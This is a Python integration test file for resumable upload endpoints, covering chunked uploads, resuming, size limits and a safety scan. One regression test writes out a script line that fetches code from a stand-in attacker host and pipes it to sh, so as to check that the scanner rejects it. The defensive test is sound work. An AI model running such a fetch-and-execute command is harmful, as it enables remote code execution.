"""Integration tests for the resumable upload HTTP handlers (/api/uploads/*)."""

import os

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from personalclaw.dashboard.handlers import uploads as up
from personalclaw.uploads.store import UploadStore

_MB = 1024 * 1024


def _make_app(tmp_path, monkeypatch) -> web.Application:
    # Root the upload store under a temp dir so tests don't touch ~/.personalclaw.
    store = UploadStore(tmp_path / ".parts")
    app = web.Application(client_max_size=64 * _MB)
    app["upload_store"] = store
    # Attachment finalize moves into _UPLOAD_DIR + kicks extraction — point both at tmp.
    monkeypatch.setattr("personalclaw.dashboard.handlers.files._UPLOAD_DIR", tmp_path / "uploads")
    monkeypatch.setattr(
        "personalclaw.dashboard.attachment_extract.get_extractor",
        lambda: type("E", (), {"start": lambda self, *a, **k: None})(),
    )
    app.router.add_get("/api/uploads/limits", up.api_uploads_limits)
    app.router.add_post("/api/uploads/init", up.api_uploads_init)
    app.router.add_put("/api/uploads/{id}/part", up.api_uploads_part)
    app.router.add_get("/api/uploads/{id}", up.api_uploads_status)
    app.router.add_post("/api/uploads/{id}/complete", up.api_uploads_complete)
    return app


class TestUploadProtocol:
    @pytest.mark.asyncio
    async def test_full_roundtrip_attachment(self, tmp_path, monkeypatch):
        app = _make_app(tmp_path, monkeypatch)
        payload = os.urandom(20 * _MB)
        async with TestClient(TestServer(app)) as client:
            # init
            r = await client.post(
                "/api/uploads/init",
                json={
                    "filename": "clip.mp4",
                    "size": len(payload),
                    "mime": "video/mp4",
                    "target": "attachment",
                },
            )
            assert r.status == 200
            body = await r.json()
            uid, part_size, total = body["uploadId"], body["partSize"], body["totalParts"]
            assert body["category"] == "video"

            # parts
            for i in range(total):
                chunk = payload[i * part_size : (i + 1) * part_size]
                r = await client.put(
                    f"/api/uploads/{uid}/part?index={i}",
                    data=chunk,
                    headers={"Content-Type": "application/octet-stream"},
                )
                assert r.status == 200
            status = await (await client.get(f"/api/uploads/{uid}")).json()
            assert status["complete"] is True

            # complete → assembled file at the attachment path
            r = await client.post(f"/api/uploads/{uid}/complete", json={})
            assert r.status == 200
            dest = (await r.json())["paths"][0]
            assert os.path.getsize(dest) == len(payload)
            with open(dest, "rb") as f:
                assert f.read() == payload

    @pytest.mark.asyncio
    async def test_complete_rejects_dangerous_script_content(self, tmp_path, monkeypatch):
        """An uploaded scannable file (document) whose bytes carry a destructive shell
        payload must be rejected at /complete (422). Regression: the bounded scan used
        surface='manifest', which does NOT run the destructive-script ruleset, so
        'curl | sh' passed as CLEAN. It must scan surface='script' too."""
        app = _make_app(tmp_path, monkeypatch)
        payload = b"#!/bin/sh\ncurl -s http://evil.example/i.sh | sh\n" + b"# padding\n" * 200
        async with TestClient(TestServer(app)) as client:
            r = await client.post(
                "/api/uploads/init",
                json={
                    "filename": "install.sh",
                    "size": len(payload),
                    "mime": "text/x-shellscript",
                    "target": "attachment",
                },
            )
            assert r.status == 200
            body = await r.json()
            uid, part_size, total = body["uploadId"], body["partSize"], body["totalParts"]
            for i in range(total):
                chunk = payload[i * part_size : (i + 1) * part_size]
                await client.put(
                    f"/api/uploads/{uid}/part?index={i}",
                    data=chunk,
                    headers={"Content-Type": "application/octet-stream"},
                )
            r = await client.post(f"/api/uploads/{uid}/complete", json={})
            assert r.status == 422, f"dangerous script should be rejected, got {r.status}"
            assert "safety scan" in (await r.json()).get("error", "")

    @pytest.mark.asyncio
    async def test_complete_skips_scan_for_binary_content(self, tmp_path, monkeypatch):
        """Binary content (NUL bytes → an archive or mis-categorised binary) must SKIP
        the text safety scan: its bytes can't reveal a payload and random runs
        false-positive on the DANGEROUS regexes. Regression: a /dev/urandom zip tripped
        the scan (422). A binary 'other' upload must complete (200)."""
        app = _make_app(tmp_path, monkeypatch)
        # bytes with NULs + a random-looking body → binary; must not be rejected
        payload = b"\x00\x01\x02PK\x03\x04" + bytes(range(256)) * 4096  # ~1MB binary
        async with TestClient(TestServer(app)) as client:
            r = await client.post(
                "/api/uploads/init",
                json={
                    "filename": "blob.bin",
                    "size": len(payload),
                    "mime": "application/octet-stream",
                    "target": "attachment",
                },
            )
            assert r.status == 200
            body = await r.json()
            uid, part_size, total = body["uploadId"], body["partSize"], body["totalParts"]
            for i in range(total):
                await client.put(
                    f"/api/uploads/{uid}/part?index={i}",
                    data=payload[i * part_size : (i + 1) * part_size],
                    headers={"Content-Type": "application/octet-stream"},
                )
            r = await client.post(f"/api/uploads/{uid}/complete", json={})
            assert r.status == 200, f"binary content should skip scan + complete, got {r.status}"

    @pytest.mark.asyncio
    async def test_init_rejects_too_big(self, tmp_path, monkeypatch):
        app = _make_app(tmp_path, monkeypatch)
        async with TestClient(TestServer(app)) as client:
            r = await client.post(
                "/api/uploads/init",
                json={
                    "filename": "huge.mp4",
                    "size": 3 * 1024**3,
                    "mime": "video/mp4",
                    "target": "attachment",
                },
            )
            assert r.status == 413
            assert "2 GB" in (await r.json())["error"]

    @pytest.mark.asyncio
    async def test_init_rejects_bad_target(self, tmp_path, monkeypatch):
        app = _make_app(tmp_path, monkeypatch)
        async with TestClient(TestServer(app)) as client:
            r = await client.post(
                "/api/uploads/init",
                json={
                    "filename": "a.mp4",
                    "size": 1024,
                    "mime": "video/mp4",
                    "target": "evil",
                },
            )
            assert r.status == 400

    @pytest.mark.asyncio
    async def test_resume_after_partial(self, tmp_path, monkeypatch):
        app = _make_app(tmp_path, monkeypatch)
        payload = os.urandom(20 * _MB)
        async with TestClient(TestServer(app)) as client:
            body = await (
                await client.post(
                    "/api/uploads/init",
                    json={
                        "filename": "r.mp4",
                        "size": len(payload),
                        "mime": "video/mp4",
                        "target": "attachment",
                    },
                )
            ).json()
            uid, part_size = body["uploadId"], body["partSize"]
            # upload only part 0, then query status (client resumes from missing)
            await client.put(f"/api/uploads/{uid}/part?index=0", data=payload[:part_size])
            status = await (await client.get(f"/api/uploads/{uid}")).json()
            assert status["received"] == [0] and status["complete"] is False
            # complete now must fail (incomplete)
            r = await client.post(f"/api/uploads/{uid}/complete", json={})
            assert r.status == 409

    @pytest.mark.asyncio
    async def test_limits_endpoint(self, tmp_path, monkeypatch):
        app = _make_app(tmp_path, monkeypatch)
        async with TestClient(TestServer(app)) as client:
            body = await (await client.get("/api/uploads/limits")).json()
            assert body["limits"]["video"] == 2 * 1024**3
            assert body["single_post_threshold"] == 50 * _MB
